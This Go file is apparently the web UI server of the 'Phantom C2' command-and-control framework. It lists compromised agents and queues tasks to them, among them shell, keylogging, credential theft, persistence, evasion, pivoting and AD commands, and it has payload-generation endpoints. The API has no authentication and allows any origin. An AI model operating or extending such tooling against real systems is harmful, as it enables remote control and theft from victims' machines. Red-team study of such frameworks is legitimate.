package webui

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/phantom-c2/phantom/internal/protocol"
	"github.com/phantom-c2/phantom/internal/server"
	"github.com/phantom-c2/phantom/internal/util"
)

// WebUI serves a full interactive browser-based interface for Phantom C2.
// Operators can choose CLI or Web UI — both have full capabilities.
type WebUI struct {
	server   *server.Server
	bindAddr string
}

// New creates a new WebUI instance.
func New(srv *server.Server, bindAddr string) *WebUI {
	return &WebUI{server: srv, bindAddr: bindAddr}
}

// Start launches the web UI HTTP server.
func (w *WebUI) Start() error {
	mux := http.NewServeMux()

	// Pages
	mux.HandleFunc("/", w.handleDashboard)

	// Read API
	mux.HandleFunc("/api/agents", w.handleAPIAgents)
	mux.HandleFunc("/api/listeners", w.handleAPIListeners)
	mux.HandleFunc("/api/tasks", w.handleAPITasks)
	mux.HandleFunc("/api/events", w.handleAPIEvents)
	mux.HandleFunc("/api/agent/", w.handleAPIAgentDetail)

	// Action API (interactive — send commands, manage listeners)
	mux.HandleFunc("/api/cmd", w.handleAPICommand)

	// Payload generation API
	mux.HandleFunc("/api/payload/generate", w.handlePayloadGenerate)
	mux.HandleFunc("/api/payload/types", w.handlePayloadTypes)
	mux.HandleFunc("/api/payload/apps", w.handlePayloadAppTemplates)
	mux.HandleFunc("/api/payload/download", w.handlePayloadDownload)

	httpServer := &http.Server{
		Addr:         w.bindAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	return httpServer.ListenAndServe()
}

// ──────── Read API ────────

func (w *WebUI) handleAPIAgents(rw http.ResponseWriter, r *http.Request) {
	agents, _ := w.server.AgentMgr.List()
	w.server.AgentMgr.RefreshStatuses()

	type agentResp struct {
		ID       string `json:"id"`
		Name     string `json:"name"`
		OS       string `json:"os"`
		Hostname string `json:"hostname"`
		Username string `json:"username"`
		IP       string `json:"ip"`
		Sleep    string `json:"sleep"`
		LastSeen string `json:"last_seen"`
		Status   string `json:"status"`
	}

	var resp []agentResp
	for _, a := range agents {
		resp = append(resp, agentResp{
			ID:       a.ID,
			Name:     a.Name,
			OS:       a.OS,
			Hostname: a.Hostname,
			Username: a.Username,
			IP:       a.ExternalIP,
			Sleep:    fmt.Sprintf("%ds/%d%%", a.Sleep, a.Jitter),
			LastSeen: util.TimeAgo(a.LastSeen),
			Status:   a.Status,
		})
	}
	if resp == nil {
		resp = []agentResp{}
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPIAgentDetail(rw http.ResponseWriter, r *http.Request) {
	// /api/agent/<name-or-id>
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 4 {
		http.Error(rw, "missing agent id", 400)
		return
	}
	agentRef := parts[3]

	a, _ := w.server.AgentMgr.Get(agentRef)
	if a == nil {
		http.Error(rw, "agent not found", 404)
		return
	}

	tasks, _ := w.server.TaskDisp.GetTaskHistory(a.ID)

	type taskItem struct {
		ID     string `json:"id"`
		Type   string `json:"type"`
		Args   string `json:"args"`
		Status string `json:"status"`
		Time   string `json:"time"`
		Output string `json:"output"`
		Error  string `json:"error"`
	}

	var taskList []taskItem
	for _, t := range tasks {
		output := ""
		errStr := ""
		result, _ := w.server.TaskDisp.GetResult(t.ID)
		if result != nil {
			if len(result.Output) > 0 {
				output = string(result.Output)
			}
			errStr = result.Error
		}
		taskList = append(taskList, taskItem{
			ID:     util.ShortID(t.ID),
			Type:   protocol.TaskTypeName(uint8(t.Type)),
			Args:   strings.Join(t.Args, " "),
			Status: protocol.StatusName(uint8(t.Status)),
			Time:   util.TimeAgo(t.CreatedAt),
			Output: output,
			Error:  errStr,
		})
	}

	resp := map[string]interface{}{
		"id":           a.ID,
		"name":         a.Name,
		"os":           a.OS,
		"arch":         a.Arch,
		"hostname":     a.Hostname,
		"username":     a.Username,
		"internal_ip":  a.InternalIP,
		"external_ip":  a.ExternalIP,
		"pid":          a.PID,
		"process_name": a.ProcessName,
		"sleep":        a.Sleep,
		"jitter":       a.Jitter,
		"first_seen":   util.FormatTimestamp(a.FirstSeen),
		"last_seen":    util.FormatTimestamp(a.LastSeen),
		"status":       a.Status,
		"tasks":        taskList,
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPIListeners(rw http.ResponseWriter, r *http.Request) {
	listeners := w.server.ListenerMgr.List()

	type listenerResp struct {
		Name   string `json:"name"`
		Type   string `json:"type"`
		Bind   string `json:"bind"`
		Status string `json:"status"`
	}

	var resp []listenerResp
	for _, l := range listeners {
		status := "stopped"
		if l.IsRunning() {
			status = "running"
		}
		resp = append(resp, listenerResp{
			Name: l.Name, Type: strings.ToUpper(l.Type), Bind: l.BindAddr, Status: status,
		})
	}
	if resp == nil {
		resp = []listenerResp{}
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPITasks(rw http.ResponseWriter, r *http.Request) {
	agents, _ := w.server.AgentMgr.List()

	type taskResp struct {
		ID     string `json:"id"`
		Agent  string `json:"agent"`
		Type   string `json:"type"`
		Args   string `json:"args"`
		Status string `json:"status"`
		Time   string `json:"time"`
		Output string `json:"output"`
	}

	var resp []taskResp
	for _, a := range agents {
		tasks, _ := w.server.TaskDisp.GetTaskHistory(a.ID)
		for _, t := range tasks {
			output := ""
			result, _ := w.server.TaskDisp.GetResult(t.ID)
			if result != nil && len(result.Output) > 0 {
				output = string(result.Output)
				if len(output) > 2000 {
					output = output[:2000] + "..."
				}
			}
			resp = append(resp, taskResp{
				ID: util.ShortID(t.ID), Agent: a.Name,
				Type: protocol.TaskTypeName(uint8(t.Type)), Args: strings.Join(t.Args, " "),
				Status: protocol.StatusName(uint8(t.Status)), Time: util.TimeAgo(t.CreatedAt),
				Output: output,
			})
		}
	}
	if resp == nil {
		resp = []taskResp{}
	}
	writeJSON(rw, resp)
}

func (w *WebUI) handleAPIEvents(rw http.ResponseWriter, r *http.Request) {
	writeJSON(rw, w.server.EventLog)
}

// ──────── Action API (Interactive) ────────

func (w *WebUI) handleAPICommand(rw http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(rw, "POST required", 405)
		return
	}

	body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))

	var req struct {
		Agent   string `json:"agent"`
		Command string `json:"command"`
		Args    string `json:"args"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		writeJSON(rw, map[string]string{"error": "invalid JSON"})
		return
	}

	// Resolve agent
	agent, _ := w.server.AgentMgr.Get(req.Agent)
	if agent == nil {
		writeJSON(rw, map[string]string{"error": "agent not found: " + req.Agent})
		return
	}

	// Parse command and queue task
	var taskType uint8
	var args []string

	if req.Args != "" {
		args = strings.Fields(req.Args)
	}

	switch strings.ToLower(req.Command) {
	case "shell":
		taskType = protocol.TaskShell
		if req.Args != "" {
			args = []string{req.Args} // Keep full command as one arg
		}
	case "sysinfo":
		taskType = protocol.TaskSysinfo
	case "ps":
		taskType = protocol.TaskProcessList
	case "screenshot":
		taskType = protocol.TaskScreenshot
	case "download":
		taskType = protocol.TaskDownload
	case "persist":
		taskType = protocol.TaskPersist
	case "sleep":
		taskType = protocol.TaskSleep
	case "cd":
		taskType = protocol.TaskCd
	case "kill":
		taskType = protocol.TaskKill
	case "evasion":
		taskType = protocol.TaskEvasion
	case "token":
		taskType = protocol.TaskToken
	case "keylog":
		taskType = protocol.TaskKeylog
	case "socks":
		taskType = protocol.TaskSocks
	case "portfwd":
		taskType = protocol.TaskPortFwd
	case "creds":
		taskType = protocol.TaskCreds
	case "pivot":
		taskType = protocol.TaskPivot
	default:
		// Check for AD commands
		if strings.HasPrefix(req.Command, "ad-") {
			taskType = protocol.TaskAD
			args = append([]string{req.Command}, args...)
		} else {
			// Treat as shell command
			taskType = protocol.TaskShell
			args = []string{req.Command + " " + req.Args}
		}
	}

	task, err := w.server.TaskDisp.CreateTask(agent.ID, taskType, args, nil)
	if err != nil {
		writeJSON(rw, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(rw, map[string]string{
		"status":  "queued",
		"task_id": task.ID,
		"agent":   agent.Name,
		"type":    protocol.TaskTypeName(taskType),
	})
}

// ──────── Dashboard ────────

func (w *WebUI) handleDashboard(rw http.ResponseWriter, r *http.Request) {
	rw.Header().Set("Content-Type", "text/html; charset=utf-8")
	rw.Write([]byte(dashboardHTML))
}

func writeJSON(rw http.ResponseWriter, data interface{}) {
	rw.Header().Set("Content-Type", "application/json")
	rw.Header().Set("Access-Control-Allow-Origin", "*")
	json.NewEncoder(rw).Encode(data)
}
